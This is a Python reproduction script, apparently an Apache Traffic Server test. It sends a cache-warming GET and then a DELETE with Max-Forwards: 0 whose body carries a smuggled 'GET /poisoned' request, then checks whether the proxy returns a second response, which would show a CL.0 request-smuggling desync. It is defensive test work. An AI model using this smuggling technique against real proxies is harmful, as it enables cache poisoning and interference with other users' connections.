"""Reproduce the DELETE/Max-Forwards self-response body-leak desync.

The proxy answers a DELETE with Max-Forwards: 0 directly from cache. If it does
not drain the accompanying request body, the leftover bytes are parsed as the
next request on the keep-alive connection (a CL.0 desync). This client warms a
path into the cache, then sends a DELETE whose body is a complete smuggled
request, and reports whether a second (smuggled) response came back.

To reproduce reliably the DELETE must land on a cache hit: a miss takes the
INTERNAL_CACHE_NOOP path, which drains the body regardless. The proxy self-answers
a hit with 200 and a miss with 404, so we key on that status to know we exercised
the hit path, retrying the warm if the object is not cached yet.
"""

#  Licensed to the Apache Software Foundation (ASF) under one
#  or more contributor license agreements.  See the NOTICE file
#  distributed with this work for additional information
#  regarding copyright ownership.  The ASF licenses this file
#  to you under the Apache License, Version 2.0 (the
#  "License"); you may not use this file except in compliance
#  with the License.  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import argparse
import socket
import sys
import time


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("proxy_address", help="Address of the proxy to connect to.")
    parser.add_argument("proxy_port", type=int, help="The port of the proxy to connect to.")
    parser.add_argument("hostname", help="The Host header field value to use.")
    return parser.parse_args()


def warm(address: str, port: int, hostname: str) -> None:
    """Fetch '/' so the proxy caches it."""
    req = (f"GET / HTTP/1.1\r\nHost: {hostname}\r\n"
           f"Connection: close\r\n\r\n").encode()
    with socket.create_connection((address, port), timeout=8) as s:
        s.sendall(req)
        s.settimeout(8)
        while True:
            try:
                if not s.recv(65536):
                    break
            except socket.timeout:
                break


def attack(address: str, port: int, hostname: str) -> bytes:
    """Send DELETE / (Max-Forwards: 0) whose body is a smuggled request."""
    smuggled = (f"GET /poisoned HTTP/1.1\r\nHost: {hostname}\r\n\r\n").encode()
    req = (f"DELETE / HTTP/1.1\r\nHost: {hostname}\r\n"
           f"Max-Forwards: 0\r\n"
           f"Content-Length: {len(smuggled)}\r\n\r\n").encode() + smuggled
    with socket.create_connection((address, port), timeout=8) as s:
        s.sendall(req)
        s.settimeout(3)
        data = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
    return data


def status_of(response: bytes) -> str:
    first_line = response.split(b"\r\n", 1)[0].decode("latin1", "replace")
    parts = first_line.split(" ")
    return parts[1] if len(parts) > 1 else "?"


def main() -> int:
    args = parse_args()
    response = b""
    delete_status = "?"
    for attempt in range(20):
        warm(args.proxy_address, args.proxy_port, args.hostname)
        time.sleep(0.3)
        response = attack(args.proxy_address, args.proxy_port, args.hostname)
        delete_status = status_of(response)
        print(f"attempt={attempt} DELETE_STATUS={delete_status}", flush=True)
        if delete_status == "200":
            # We exercised the cache-hit self-response path. Measure here.
            break

    num_responses = response.count(b"HTTP/1.1 ")
    print(f"DELETE_STATUS={delete_status}")
    print(f"RESPONSE_COUNT={num_responses}")
    print(f"SECOND_RESPONSE_RECEIVED={num_responses >= 2}")
    print("----- raw bytes the proxy returned for the DELETE -----")
    sys.stdout.write(response.decode("latin1", "replace"))
    print("\n----- end -----")
    return 0


if __name__ == "__main__":
    sys.exit(main())
